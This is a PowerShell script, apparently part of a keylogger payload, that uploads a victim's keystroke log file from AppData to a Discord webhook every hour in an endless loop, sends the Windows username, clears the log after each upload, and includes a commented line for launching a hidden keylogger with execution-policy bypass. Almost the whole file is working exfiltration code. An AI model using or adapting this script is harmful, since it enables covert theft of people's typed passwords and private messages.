# powershell log scheduler
# created by  : C0SM0
# Modified by : Jakoby

$Path="$env:appdata\-locker\$env:UserName-loot.txt"

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}



# times logs will be sent [keep in military time]
$logTimes = @(
    '00:00:00',
    '01:00:00',
    '02:00:00',
    '03:00:00',
    '04:00:00',
    '05:00:00',
    '06:00:00',
    '07:00:00',
    '08:00:00',
    '09:00:00',
    '10:00:00',
    '11:00:00',
    '12:00:00',
    '13:00:00',
    '14:00:00',
    '15:00:00',
    '16:00:00',
    '17:00:00',
    '18:00:00',
    '19:00:00',
    '20:00:00',
    '21:00:00',
    '22:00:00',
    '23:00:00'
)

# sort the times in chronological order
$logTimes = $logTimes | Sort-Object

# ensure keylogger runs every day
while ($true) {

    # run keylogger for each trigger time
    foreach ($t in $logTimes)
    {
        # checks if time passed already
        if((Get-Date) -lt (Get-Date -Date $t))
        {
            # sleeps until next time is reached
            while ((Get-Date -Date $t) -gt (Get-Date))
            {
              # sleeps
              (Get-Date -Date $t) - (Get-Date) | Start-Sleep
            }
  
            # runs keylogger
			Upload-Discord -file $Path
            echo "" > $Path 
            #powershell Start-Process powershell.exe -windowstyle hidden -ep bypass "$env:appdata/keys.ps1"
			
        }
    }
}